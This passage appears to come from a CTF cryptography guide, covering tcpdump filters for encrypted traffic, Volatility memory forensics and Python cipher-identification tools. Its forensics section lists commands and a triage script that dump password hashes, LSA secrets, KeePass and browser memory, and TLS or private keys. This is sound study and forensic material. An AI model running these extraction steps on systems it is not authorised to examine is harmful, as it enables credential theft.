sudo tcpdump -i eth0 -X

# Print in hex only
sudo tcpdump -i eth0 -xx

# Timestamp format
sudo tcpdump -i eth0 -tttt  # Human-readable
```

#### Crypto Traffic Filters

**SSL/TLS Capture:**
```bash
# Capture HTTPS traffic (port 443)
sudo tcpdump -i eth0 port 443 -w https.pcap

# Capture SSL/TLS handshake
sudo tcpdump -i eth0 'tcp port 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16)'

# Multiple SSL/TLS ports
sudo tcpdump -i eth0 'port 443 or port 8443' -w ssl_traffic.pcap

# Capture TLS Client Hello
sudo tcpdump -i eth0 'tcp dst port 443 and tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16 and tcp[((tcp[12:1] & 0xf0) >> 2) + 5:1] = 0x01'
```

**SSH Traffic:**
```bash
# Capture SSH connections
sudo tcpdump -i eth0 port 22 -w ssh.pcap

# SSH traffic to specific host
sudo tcpdump -i eth0 'dst host 192.168.1.100 and port 22'

# Detect SSH handshake
sudo tcpdump -i eth0 'tcp port 22 and tcp[13] = 0x02'  # SYN flag
```

**IPSec Traffic:**
```bash
# Capture ESP (Encapsulating Security Payload)
sudo tcpdump -i eth0 esp -w ipsec_esp.pcap

# Capture AH (Authentication Header)
sudo tcpdump -i eth0 ah -w ipsec_ah.pcap

# Capture IKE (Internet Key Exchange)
sudo tcpdump -i eth0 'udp port 500 or udp port 4500' -w ike.pcap

# All IPSec related traffic
sudo tcpdump -i eth0 '(esp or ah or (udp port 500) or (udp port 4500))' -w ipsec_all.pcap
```

**VPN Traffic:**
```bash
# OpenVPN (UDP)
sudo tcpdump -i eth0 'udp port 1194' -w openvpn.pcap

# OpenVPN (TCP)
sudo tcpdump -i eth0 'tcp port 1194' -w openvpn_tcp.pcap

# WireGuard
sudo tcpdump -i eth0 'udp port 51820' -w wireguard.pcap

# L2TP
sudo tcpdump -i eth0 'udp port 1701' -w l2tp.pcap
```

#### Advanced Filtering

**Complex Crypto Filters:**
```bash
# Capture only handshakes (SYN, SYN-ACK, ACK)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0' -w handshakes.pcap

# Capture TLS version negotiation
# TLS 1.0: 0x0301, TLS 1.1: 0x0302, TLS 1.2: 0x0303, TLS 1.3: 0x0304
sudo tcpdump -i eth0 'tcp port 443 and tcp[20] = 0x03' -w tls_versions.pcap

# Capture only large packets (possible crypto payloads)
sudo tcpdump -i eth0 'greater 1000' -w large_packets.pcap

# Exclude noise, focus on crypto ports
sudo tcpdump -i eth0 'port 443 or port 22 or port 3389' -w crypto_ports.pcap

# Capture to/from specific crypto server
sudo tcpdump -i eth0 'host crypto.target.com and (port 443 or port 22)' -w target.pcap
```

**BPF (Berkeley Packet Filter) Syntax:**
```bash
# Combine filters with logical operators
sudo tcpdump -i eth0 'tcp and port 443 and host 192.168.1.100'

# OR conditions
sudo tcpdump -i eth0 'port 443 or port 8443'

# NOT conditions
sudo tcpdump -i eth0 'not port 22'

# Complex combinations
sudo tcpdump -i eth0 '(tcp port 443 or tcp port 8443) and host 192.168.1.0/24'

# Protocol-specific
sudo tcpdump -i eth0 'tcp and not port 22 and not port 80'
```

#### CTF-Specific Usage

**Capture Challenge Traffic:**
```bash
# Monitor all traffic during CTF challenge
sudo tcpdump -i eth0 -w ctf_$(date +%Y%m%d_%H%M%S).pcap

# Capture while running exploit
sudo tcpdump -i eth0 -w exploit_traffic.pcap &
TCPDUMP_PID=$!
./exploit.py
sudo kill $TCPDUMP_PID

# Capture DNS queries (potential data exfiltration)
sudo tcpdump -i eth0 'udp port 53' -w dns.pcap
```

**Real-Time Analysis:**
```bash
# Display TLS handshakes in real-time
sudo tcpdump -i eth0 -A 'tcp port 443'

# Show only data packets (PSH flag)
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-push != 0'

# Monitor for specific hex pattern
sudo tcpdump -i eth0 -X | grep -A 10 "pattern"

# Count packets per host
sudo tcpdump -i eth0 -n | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -n
```

**Reading and Post-Processing:**
```bash
# Read captured file
tcpdump -r capture.pcap

# Filter after capture
tcpdump -r capture.pcap 'port 443'

# Extract specific stream
tcpdump -r capture.pcap -w filtered.pcap 'host 192.168.1.100'

# Convert timestamps
tcpdump -r capture.pcap -tttt

# Print packet details
tcpdump -r capture.pcap -vvv -X

# Export to text for grep
tcpdump -r capture.pcap -A > traffic.txt
grep "pattern" traffic.txt
```

#### Integration with Other Tools

**Pipe to Wireshark:**
```bash
# Real-time viewing in Wireshark
sudo tcpdump -i eth0 -w - | wireshark -k -i -

# Capture and analyze simultaneously
sudo tcpdump -i eth0 -U -w - | tee capture.pcap | wireshark -k -i -
```

**Extract Data for Analysis:**
```bash
# Extract SSL/TLS certificates
tcpdump -r capture.pcap -x 'tcp port 443' | grep -A 50 "Certificate"

# Export hex dump for crypto analysis
tcpdump -r capture.pcap -xx 'port 443' > hex_dump.txt

# Extract payload data
tcpdump -r capture.pcap -A 'tcp port 443' | sed -n '/Server Hello/,/Certificate/p' > server_hello.txt
```

### volatility

Volatility is an advanced memory forensics framework for analyzing RAM dumps, critical for extracting cryptographic keys and secrets from memory.

#### Installation

**Kali Linux (Volatility 2):**
```bash
# Install Volatility 2
sudo apt update
sudo apt install volatility

# Verify installation
volatility --info

# Common profile location
ls /usr/lib/python2.7/dist-packages/volatility/plugins/overlays/linux/
```

**Volatility 3 Installation:**
```bash
# Install via pip
pip3 install volatility3

# Or from GitHub
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
python3 setup.py install

# Verify
vol -h
```

**Symbol Tables:**
```bash
# Download symbol tables (Volatility 3)
# For Linux analysis
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/volatility3/framework/symbols/linux

# For Windows analysis
# Symbols are bundled with Volatility 3
```

#### Basic Memory Analysis

**Image Information:**
```bash
# Volatility 2
volatility -f memory.dump imageinfo

# Suggested profiles will be displayed
# Use most appropriate profile for further analysis

# Volatility 3 (auto-detects OS)
vol -f memory.dump windows.info
vol -f memory.dump linux.info
```

**Process Listing:**
```bash
# Volatility 2
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 pstree
volatility -f memory.dump --profile=Win7SP1x64 psscan  # Find hidden processes

# Volatility 3
vol -f memory.dump windows.pslist
vol -f memory.dump windows.pstree
```

#### Crypto-Specific Analysis

**Extract Encryption Keys:**
```bash
# TrueCrypt/VeraCrypt keys (Volatility 2)
volatility -f memory.dump --profile=Win7SP1x64 truecryptmaster
volatility -f memory.dump --profile=Win7SP1x64 truecryptpassphrase

# Extract from specific process
volatility -f memory.dump --profile=Win7SP1x64 truecryptsummary

# Volatility 3
vol -f memory.dump windows.truecrypt.Passphrase
```

**SSH Keys and Passwords:**
```bash
# Volatility 2
# Dump process memory containing ssh/sshd
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_bash
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_psaux | grep ssh

# Dump specific process
volatility -f memory.dump --profile=LinuxUbuntu1604x64 linux_dump_map -p <PID> -D output/

# Search for SSH keys in dumps
grep -r "BEGIN RSA PRIVATE KEY" output/
grep -r "BEGIN OPENSSH PRIVATE KEY" output/
```

**Browser Crypto Data:**
```bash
# Volatility 2 - Extract browser history (may contain keys/passwords)
volatility -f memory.dump --profile=Win7SP1x64 iehistory
volatility -f memory.dump --profile=Win7SP1x64 chromehistory

# Dump browser process memory
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <CHROME_PID> -D output/

# Search for crypto patterns
strings output/*.dmp | grep -i "password"
strings output/*.dmp | grep -i "key"
strings output/*.dmp | grep -E "-----BEGIN.*KEY-----"
```

**SSL/TLS Session Keys:**
```bash
# Dump Firefox process memory
volatility -f memory.dump --profile=Win7SP1x64 pslist | grep firefox
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <FIREFOX_PID> -D output/

# Search for SSL master keys
strings output/*.dmp | grep "CLIENT_RANDOM"

# Extract SSL session keys for Wireshark decryption
strings output/*.dmp | grep -A 1 "CLIENT_RANDOM" > sslkeys.log
```

**Certificate Extraction:**
```bash
# Volatility 2 - Dump relevant process memory
volatility -f memory.dump --profile=Win7SP1x64 filescan | grep -i cert
volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q <OFFSET> -D output/

# Search for X.509 certificates
strings output/* | grep "BEGIN CERTIFICATE"

# Extract certificate data
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D certs/
binwalk -e certs/*.dmp --dd='.*'
```

#### Registry and Credential Analysis

**Windows Credentials:**
```bash
# Volatility 2 - LSA secrets
volatility -f memory.dump --profile=Win7SP1x64 lsadump

# Cached domain credentials
volatility -f memory.dump --profile=Win7SP1x64 cachedump

# SAM hashes
volatility -f memory.dump --profile=Win7SP1x64 hashdump

# Volatility 3
vol -f memory.dump windows.hashdump
vol -f memory.dump windows.lsadump
vol -f memory.dump windows.cachedump
```

**Registry Keys:**
```bash
# Volatility 2 - List registry hives
volatility -f memory.dump --profile=Win7SP1x64 hivelist

# Dump specific registry hive
volatility -f memory.dump --profile=Win7SP1x64 printkey -o <OFFSET> -K "Microsoft\Windows\CurrentVersion"

# Search for encryption-related keys
volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\SystemCertificates"
```

**Password Managers:**
```bash
# Dump KeePass process
volatility -f memory.dump --profile=Win7SP1x64 pslist | grep -i keepass
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <KEEPASS_PID> -D keepass/

# Search for master password in memory
strings keepass/*.dmp | grep -i "password"

# Extract database from memory
binwalk keepass/*.dmp | grep -i "keepass"
```

#### String Searching and Pattern Matching

**Crypto Pattern Search:**
```bash
# Volatility 2 - String search
volatility -f memory.dump --profile=Win7SP1x64 yarascan -Y "BEGIN RSA PRIVATE KEY"

# Volatility 3
vol -f memory.dump windows.strings | grep -i "password"
vol -f memory.dump windows.strings | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"  # Base64

# Custom YARA rules for crypto artifacts
cat > crypto_keys.yar << 'EOF'
rule RSA_Private_Key {
    strings:
        $rsa = "-----BEGIN RSA PRIVATE KEY-----"
    condition:
        $rsa
}

rule AES_Key_Schedule {
    strings:
        $key = { 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 }
    condition:
        $key
}
EOF

volatility -f memory.dump --profile=Win7SP1x64 yarascan -y crypto_keys.yar
```

**Bulk String Extraction:**
```bash
# Volatility 2 - Extract all strings
volatility -f memory.dump --profile=Win7SP1x64 strings -s strings.txt

# Process strings with crypto focus
cat strings.txt | grep -E "(password|key|secret|token)" > crypto_strings.txt
cat strings.txt | grep -E "^[A-Za-z0-9+/]{32,}={0,2}$" > potential_base64.txt
cat strings.txt | grep -E "-----BEGIN.*-----" > pem_keys.txt
```

#### Network Connection Analysis

**Active Connections:**
```bash
# Volatility 2
volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 connections  # XP/2003
volatility -f memory.dump --profile=Win7SP1x64 connscan

# Volatility 3
vol -f memory.dump windows.netscan

# Filter for crypto ports
vol -f memory.dump windows.netscan | grep -E "(443|22|3389)"
```

**Network Packet Reconstruction:**
```bash
# Volatility 2 - Extract network packets from memory
volatility -f memory.dump --profile=Win7SP1x64 netscan
# Note PID of interesting connections

# Dump process memory containing network buffers
volatility -f memory.dump --profile=Win7SP1x64 memdump -p <PID> -D network/

# Use tcpflow to extract streams
tcpflow -r network/*.dmp -o streams/
```

#### CTF-Specific Techniques

**Quick Crypto Triage:**
```bash
# Automated script for crypto artifact extraction
#!/bin/bash

DUMP=$1
PROFILE=$2

echo "[*] Starting crypto triage..."

# Hash dump
echo "[+] Extracting password hashes..."
volatility -f $DUMP --profile=$PROFILE hashdump > hashes.txt

# LSA secrets
echo "[+] Extracting LSA secrets..."
volatility -f $DUMP --profile=$PROFILE lsadump > lsa.txt

# Process list
echo "[+] Analyzing processes..."
volatility -f $DUMP --profile=$PROFILE pslist > processes.txt

# Search for crypto processes
grep -i "crypt\|ssl\|gpg\|keepass\|truecrypt" processes.txt

# String extraction
echo "[+] Extracting crypto strings..."
volatility -f $DUMP --profile=$PROFILE strings -s strings.txt
grep -E "(BEGIN.*KEY|password|secret)" strings.txt > crypto_findings.txt

echo "[*] Triage complete. Check crypto_findings.txt"
```

**Memory Dump from Running System:**
```bash
# Linux - Using LiME (Linux Memory Extractor)
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make
sudo insmod lime-*.ko "path=/tmp/memory.lime format=lime"

# Windows - Using WinPmem
wget https://github.com/Velocidex/WinPmem/releases/download/v4.0.rc1/winpmem_mini_x64_rc2.exe
winpmem_mini_x64_rc2.exe memory.raw

# macOS - Using OSXPmem
# Requires disabling SIP
wget https://github.com/google/rekall/releases/download/v1.5.1/osxpmem-2.1.post4.zip
sudo osxpmem.app/osxpmem -o memory.aff4
```

### Important Related Topics

For comprehensive CTF cryptography preparation, consider these essential related areas:

- **Binary Analysis Techniques** - IDA Pro patterns, Ghidra scripting, automatic crypto function identification
- **Side-Channel Analysis** - Power analysis, timing attacks, cache timing for key extraction
- **Firmware Analysis** - Extracting crypto keys from embedded systems and IoT devices
- **Malware Cryptography** - Ransomware key extraction, encrypted C2 communications analysis
- **Cloud Crypto Forensics** - AWS KMS, Azure Key Vault, encrypted storage analysis

---

# COMMON CTF CIPHER SCENARIOS

## Mystery Ciphers

Mystery cipher challenges present ciphertext without identifying the encryption method, requiring systematic analysis before attempting decryption.

### Identify-Then-Break Approach

**Systematic Identification Methodology:**

**Phase 1: Initial Reconnaissance**

Character set analysis:

```python
def analyze_charset(ciphertext):
    unique_chars = set(ciphertext)
    
    print(f"Total characters: {len(ciphertext)}")
    print(f"Unique characters: {len(unique_chars)}")
    print(f"Character set: {sorted(unique_chars)}")
    
    # Classify by character types
    if unique_chars.issubset(set('ABCDEFGHIJKLMNOPQRSTUVWXYZ')):
        print("Pure uppercase alphabetic")
    elif unique_chars.issubset(set('01')):
        print("Binary")
    elif unique_chars.issubset(set('0123456789ABCDEF')):
        print("Hexadecimal")
    elif unique_chars.issubset(set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')):
        print("Possible Base64")

# Usage:
ciphertext = "KHOOR ZRUOG"
analyze_charset(ciphertext)
```

Length and structure patterns:

```python
def structural_analysis(ciphertext):
    # Check for block patterns
    words = ciphertext.split()
    word_lengths = [len(w) for w in words]
    
    print(f"Number of words/blocks: {len(words)}")
    print(f"Word length distribution: {set(word_lengths)}")
    
    # Check for repeating patterns
    for length in range(2, min(20, len(ciphertext)//2)):
        patterns = {}
        for i in range(0, len(ciphertext) - length):
            pattern = ciphertext[i:i+length]
            if pattern in patterns:
                patterns[pattern] += 1
            else:
                patterns[pattern] = 1
        
        repeating = {k: v for k, v in patterns.items() if v > 1}
        if repeating:
            print(f"\nRepeating {length}-char patterns:")
            for pattern, count in sorted(repeating.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"  '{pattern}': {count} times")
```

**Phase 2: Statistical Analysis**

Index of Coincidence (IoC) calculation:

```python
def calculate_ioc(text):
    """
    IoC helps distinguish cipher types:
    - Random: ~0.0385 (26-letter alphabet)
    - English plaintext: ~0.0667
    - Monoalphabetic substitution: ~0.0667
    - Polyalphabetic (Vigenère): ~0.0385 to 0.0667
    - Transposition: ~0.0667
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    N = len(text)
    
    if N <= 1:
        return 0
    
    frequencies = {}
    for char in text:
        frequencies[char] = frequencies.get(char, 0) + 1
    
    ioc = sum(f * (f - 1) for f in frequencies.values()) / (N * (N - 1))
    
    return ioc

# Interpretation:
text = "YOUR_CIPHERTEXT_HERE"
ioc = calculate_ioc(text)
print(f"IoC: {ioc:.4f}")

if ioc > 0.06:
    print("Likely: Monoalphabetic substitution or transposition")
elif 0.04 < ioc < 0.06:
    print("Likely: Polyalphabetic cipher (Vigenère, etc.)")
else:
    print("Likely: Random or strong encryption")
```

Entropy measurement:

```python
import math
from collections import Counter

def calculate_entropy(data):
    """
    Entropy indicates randomness:
    - English text: ~4.0-4.5 bits/char
    - Compressed/encrypted: ~7.5-8.0 bits/char
    - Hex-encoded binary: ~4.0 bits/char
    """
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    
    entropy = -sum((count/length) * math.log2(count/length) 
                   for count in counter.values())
    
    return entropy

# Usage:
entropy = calculate_entropy(ciphertext)
print(f"Entropy: {entropy:.2f} bits/char")

if entropy < 4.5:
    print("Low entropy - likely encoded, not encrypted")
elif entropy < 6.0:
    print("Medium entropy - weak encryption or compression")
else:
    print("High entropy - strong encryption or random data")
```

**Phase 3: Cipher Classification Decision Tree**

```python
def classify_cipher(ciphertext):
    """
    Systematic cipher classification based on characteristics
    """
    results = []
    
    # Remove whitespace for analysis
    clean_text = ''.join(ciphertext.split())
    
    # 1. Character set check
    if all(c in '01' for c in clean_text):
        results.append("Binary encoding")
    
    if all(c in '0123456789ABCDEF' for c in clean_text.upper()):
        results.append("Hexadecimal encoding")
    
    if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in clean_text):
        results.append("Possible Base64")
    
    # 2. Pattern checks
    if len(clean_text) % 2 == 0 and all(c.isdigit() for c in clean_text):
        results.append("Possible numeric cipher (A=01, B=02, etc.)")
    
    # 3. Statistical checks
    ioc = calculate_ioc(clean_text)
    if ioc > 0.06:
        results.append("Monoalphabetic substitution or transposition (high IoC)")
    elif 0.04 < ioc < 0.06:
        results.append("Polyalphabetic cipher (medium IoC)")
    
    # 4. Length analysis
    if len(clean_text) < 50:
        results.append("Short cipher - consider classical methods")
    
    # 5. Visual patterns
    if '=' in ciphertext[-3:]:
        results.append("Base64 padding detected")
    
    return results

# Complete analysis:
print("Classification results:")
for result in classify_cipher(ciphertext):
    print(f"  - {result}")
```

**Automated Multi-Tool Pipeline:**

```bash
#!/bin/bash
# mystery_cipher_analyzer.sh

CIPHER_FILE=$1

echo "=== Character Set Analysis ==="
cat $CIPHER_FILE | tr -cd '[:print:]' | fold -w1 | sort | uniq -c | sort -rn

echo -e "\n=== Length Analysis ==="
echo "Total characters: $(cat $CIPHER_FILE | wc -c)"
echo "Total words: $(cat $CIPHER_FILE | wc -w)"

echo -e "\n=== Attempting Base64 decode ==="
cat $CIPHER_FILE | base64 -d 2>/dev/null && echo "[SUCCESS]" || echo "[FAILED]"

echo -e "\n=== Attempting Hex decode ==="
cat $CIPHER_FILE | xxd -r -p 2>/dev/null && echo "[SUCCESS]" || echo "[FAILED]"

echo -e "\n=== ROT13 test ==="
cat $CIPHER_FILE | tr 'A-Za-z' 'N-ZA-Mn-za-m'

echo -e "\n=== Checking for common cipher keywords ==="
grep -iE 'flag|ctf|the|and|key' $CIPHER_FILE && echo "[Potential plaintext]"
```

### Visual Pattern Recognition

**Pattern-Based Cipher Identification:**

**Symbol-Based Ciphers:**

Pigpen/Masonic cipher detection:

```
Visual characteristics:
- Grid-based symbols (tic-tac-toe patterns)
- Dots within or outside grids
- No alphanumeric characters

Example symbols:
└ ┘ ┌ ┐ ⌐ ¬ ⊥ ⊤ • ∟

Decryption approach:
1. Identify grid layout (2×2, 3×3, or X-shaped)
2. Map symbols to alphabet positions
3. Use Dcode.fr Pigpen decoder
```

Braille pattern recognition:

```
Characteristics:
- 6-dot or 8-dot patterns
- Unicode Braille characters (U+2800 to U+28FF)
- Example: ⠓⠑⠇⠇⠕ = "hello"

Detection:
import unicodedata
def detect_braille(text):
    braille_count = sum(1 for c in text 
                       if 0x2800 <= ord(c) <= 0x28FF)
    return braille_count > len(text) * 0.5
```

Morse code visual patterns:

```
Characteristics:
- Dots (.) and dashes (-)
- Alternative: 0/1, short/long spaces
- Word separators (/, |, or spaces)

Example: 
.... . .-.. .-.. --- = HELLO

Variants to check:
- Standard ITU morse
- American morse
- Custom dit/dah representations (- and _, 0 and 1)
```

**Structured Format Patterns:**

Grid-based cipher detection:

```python
def detect_grid_cipher(text):
    """
    Detects ciphers that use grid structures
    """
    # Remove whitespace
    clean = ''.join(text.split())
    length = len(clean)
    
    # Check for perfect square (Polybius, Playfair)
    sqrt = int(length ** 0.5)
    if sqrt * sqrt == length:
        print(f"Perfect square: {sqrt}x{sqrt} grid possible")
        print("Candidate ciphers: Polybius Square, Playfair")
    
    # Check for rectangular grids
    for rows in range(2, 20):
        if length % rows == 0:
            cols = length // rows
            print(f"Rectangular grid: {rows}x{cols}")
            if rows < 10 and cols < 30:
                print("Candidate: Rail Fence, Columnar Transposition")
    
    # Check for common transposition key lengths
    for key_len in range(2, min(15, length // 2)):
        if length % key_len == 0:
            print(f"Possible key length: {key_len}")

# Usage:
detect_grid_cipher("HLOOLELWRD")
```

Visual block patterns:

```python
def format_as_blocks(text, block_size):
    """
    Reformat text to identify visual patterns
    """
    clean = ''.join(text.split())
    blocks = [clean[i:i+block_size] for i in range(0, len(clean), block_size)]
    
    print(f"\n{block_size}-character blocks:")
    for i, block in enumerate(blocks):
        print(f"{i:3d}: {block}")
    
    # Check for repeating blocks
    unique_blocks = len(set(blocks))
    print(f"\nUnique blocks: {unique_blocks}/{len(blocks)}")
    if unique_blocks < len(blocks) * 0.5:
        print("High repetition - possible block cipher with ECB mode")

# Try multiple block sizes
for size in [4, 8, 16, 32]:
    format_as_blocks(ciphertext, size)
```

**Color/Image-Based Encoding:**

When ciphertext is presented as an image:

```python
from PIL import Image
import numpy as np

def analyze_cipher_image(image_path):
    """
    Extract data from image-based ciphers
    """
    img = Image.open(image_path)
    pixels = np.array(img)
    
    print(f"Image size: {img.size}")
    print(f"Mode: {img.mode}")
    print(f"Pixel array shape: {pixels.shape}")
    
    # Check for LSB steganography
    lsb_data = pixels & 1  # Extract least significant bits
    print("\nLSB distribution:", np.bincount(lsb_data.flatten()))
    
    # Check for color-coded data
    if img.mode == 'RGB':
        unique_colors = len(np.unique(pixels.reshape(-1, 3), axis=0))
        print(f"Unique colors: {unique_colors}")
        
        if unique_colors <= 26:
            print("Possible color-to-letter mapping")
        elif unique_colors <= 256:
            print("Possible color-to-byte mapping")
    
    # Extract potential binary data from pixels
    binary_string = ''.join(str(b) for b in lsb_data.flatten())
    print(f"\nFirst 100 LSB bits: {binary_string[:100]}")

# QR code detection
def check_qr_code(image_path):
    try:
        from pyzbar.pyzbar import decode
        img = Image.open(image_path)
        decoded = decode(img)
        if decoded:
            print("QR Code detected:")
            for obj in decoded:
                print(f"  Data: {obj.data.decode()}")
                print(f"  Type: {obj.type}")
    except ImportError:
        print("Install pyzbar: pip install pyzbar")
```

### Frequency Distribution Hints

**Frequency Analysis Techniques:**

**Single Character Frequency:**

```python
from collections import Counter
import string

def frequency_analysis(text, top_n=10):
    """
    Comprehensive frequency analysis for cipher identification
    """
    # Clean text (letters only)
    clean = ''.join(c.upper() for c in text if c.isalpha())
    
    # Calculate frequencies
    total = len(clean)
    freq = Counter(clean)
    
    print(f"Total letters: {total}")
    print(f"Unique letters: {len(freq)}")
    print(f"\nTop {top_n} characters:")
    
    for char, count in freq.most_common(top_n):
        percentage = (count / total) * 100
        print(f"  {char}: {count:4d} ({percentage:5.2f}%)")
    
    # Compare with English frequencies
    english_freq = {
        'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97,
        'N': 6.75, 'S': 6.33, 'H': 6.09, 'R': 5.99, 'D': 4.25
    }
    
    print("\nExpected English (top 10):")
    for char, pct in list(english_freq.items())[:10]:
        print(f"  {char}: {pct:5.2f}%")
    
    # Calculate chi-squared statistic
    chi_squared = 0
    for char in string.ascii_uppercase:
        expected = english_freq.get(char, 1.0)
        observed = (freq.get(char, 0) / total * 100) if total > 0 else 0
        chi_squared += ((observed - expected) ** 2) / expected
    
    print(f"\nChi-squared statistic: {chi_squared:.2f}")
    print("(Lower is closer to English; < 50 suggests substitution cipher)")
    
    return freq

# Usage:
freq = frequency_analysis(ciphertext)
```

**Bigram and Trigram Analysis:**

```python
def ngram_analysis(text, n=2, top=10):
    """
    N-gram frequency analysis
    Useful for identifying:
    - Digraphic ciphers (Playfair, Four-Square)
    - Pattern-based transposition
    - Language identification
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    
    ngrams = [clean[i:i+n] for i in range(len(clean) - n + 1)]
    freq = Counter(ngrams)
    
    print(f"\nTop {top} {n}-grams:")
    for ngram, count in freq.most_common(top):
        print(f"  {ngram}: {count}")
    
    # Common English bigrams for comparison
    if n == 2:
        common_bigrams = ['TH', 'HE', 'IN', 'ER', 'AN', 'RE', 'ON', 'AT', 'EN', 'ND']
        print(f"\nCommon English bigrams: {', '.join(common_bigrams)}")
    
    # Common English trigrams
    if n == 3:
        common_trigrams = ['THE', 'AND', 'ING', 'HER', 'HAT', 'HIS', 'THA', 'ERE', 'FOR', 'ENT']
        print(f"\nCommon English trigrams: {', '.join(common_trigrams)}")
    
    return freq

# Usage:
bigrams = ngram_analysis(ciphertext, n=2)
trigrams = ngram_analysis(ciphertext, n=3)
```

**Pattern Word Identification:**

```python
def pattern_words(text):
    """
    Identify words by their letter patterns
    Useful for ciphertext word attack on substitution ciphers
    
    Example: HELLO -> ABCCD pattern
             ATTACK -> ABBCDE pattern
    """
    def get_pattern(word):
        mapping = {}
        pattern = []
        next_char = 0
        
        for char in word:
            if char not in mapping:
                mapping[char] = next_char
                next_char += 1
            pattern.append(str(mapping[char]))
        
        return ''.join(pattern)
    
    words = text.upper().split()
    patterns = {}
    
    for word in words:
        if word.isalpha():
            pattern = get_pattern(word)
            if pattern not in patterns:
                patterns[pattern] = []
            patterns[pattern].append(word)
    
    print("Word patterns (duplicates indicate same plaintext word):")
    for pattern, words_list in sorted(patterns.items(), key=lambda x: len(x[1]), reverse=True):
        if len(words_list) > 1:
            print(f"  Pattern {pattern}: {words_list}")
    
    # Common English word patterns
    common_patterns = {
        '0': ['A', 'I'],
        '01': ['OF', 'TO', 'IN', 'IT', 'IS', 'BE', 'AS', 'AT', 'SO', 'WE', 'HE'],
        '012': ['THE', 'AND', 'FOR', 'ARE', 'BUT', 'NOT', 'YOU', 'ALL', 'CAN', 'HER'],
        '0110': ['THAT', 'WITH', 'BEEN', 'HAVE', 'FROM', 'THEY'],
    }
    
    print("\nCommon English patterns for reference:")
    for pattern, examples in common_patterns.items():
        print(f"  {pattern}: {', '.join(examples)}")

# Usage:
pattern_words(ciphertext)
```

**Frequency Distribution Visualization:**

```python
import matplotlib.pyplot as plt

def visualize_frequency(text, title="Character Frequency Distribution"):
    """
    Visual comparison with English frequency
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    freq = Counter(clean)
    total = len(clean)
    
    # Calculate percentages
    cipher_freq = {char: (freq.get(char, 0) / total * 100) 
                   for char in string.ascii_uppercase}
    
    # English frequency distribution
    english_freq = {
        'A': 8.17, 'B': 1.49, 'C': 2.78, 'D': 4.25, 'E': 12.70,
        'F': 2.23, 'G': 2.02, 'H': 6.09, 'I': 6.97, 'J': 0.15,
        'K': 0.77, 'L': 4.03, 'M': 2.41, 'N': 6.75, 'O': 7.51,
        'P': 1.93, 'Q': 0.10, 'R': 5.99, 'S': 6.33, 'T': 9.06,
        'U': 2.76, 'V': 0.98, 'W': 2.36, 'X': 0.15, 'Y': 1.97,
        'Z': 0.07
    }
    
    letters = string.ascii_uppercase
    cipher_values = [cipher_freq[c] for c in letters]
    english_values = [english_freq[c] for c in letters]
    
    plt.figure(figsize=(14, 6))
    x = range(26)
    width = 0.35
    
    plt.bar([i - width/2 for i in x], cipher_values, width, label='Ciphertext', alpha=0.8)
    plt.bar([i + width/2 for i in x], english_values, width, label='English', alpha=0.8)
    
    plt.xlabel('Letter')
    plt.ylabel('Frequency (%)')
    plt.title(title)
    plt.xticks(x, letters)
    plt.legend()
    plt.grid(axis='y', alpha=0.3)
    plt.tight_layout()
    plt.savefig('frequency_distribution.png', dpi=150)
    print("Saved frequency distribution to frequency_distribution.png")

# Usage:
visualize_frequency(ciphertext)
```

**Cipher Type Inference from Frequency:**

```python
def infer_cipher_type(text):
    """
    Make educated guesses about cipher type based on frequency
    """
    clean = ''.join(c.upper() for c in text if c.isalpha())
    freq = Counter(clean)
    total = len(clean)
    
    # Calculate metrics
    ioc = calculate_ioc(clean)
    top_freq = freq.most_common(1)[0][1] / total if freq else 0
    unique_ratio = len(freq) / 26
    
    print("Frequency-based cipher inference:")
    print(f"  IoC: {ioc:.4f}")
    print(f"  Highest frequency: {top_freq*100:.2f}%")
    print(f"  Unique letter ratio: {unique_ratio:.2f}")
    
    # Inference rules
    inferences = []
    
    if ioc > 0.065:
        inferences.append("[Inference] Monoalphabetic substitution (high IoC)")
    elif 0.045 < ioc < 0.055:
        inferences.append("[Inference] Polyalphabetic cipher like Vigenère (medium IoC)")
    elif ioc < 0.045:
        inferences.append("[Inference] Random or modern encryption (low IoC)")
    
    if top_freq > 0.15:
        inferences.append("[Inference] Likely simple substitution (high peak frequency)")
    
    if unique_ratio < 0.5:
        inferences.append("[Inference] Limited character set, possible simple encoding")
    elif unique_ratio > 0.95:
        inferences.append("[Inference] Full alphabet used, likely sophisticated cipher")
    
    # Check if frequency distribution is flat
    freq_values = list(freq.values())
    avg_freq = sum(freq_values) / len(freq_values)
    variance = sum((f - avg_freq)**2 for f in freq_values) / len(freq_values)
    
    if variance < avg_freq * 0.5:
        inferences.append("[Inference] Flat distribution suggests polyalphabetic or modern cipher")
    
    for inference in inferences:
        print(f"  {inference}")
    
    return inferences

# Usage:
infer_cipher_type(ciphertext)
```

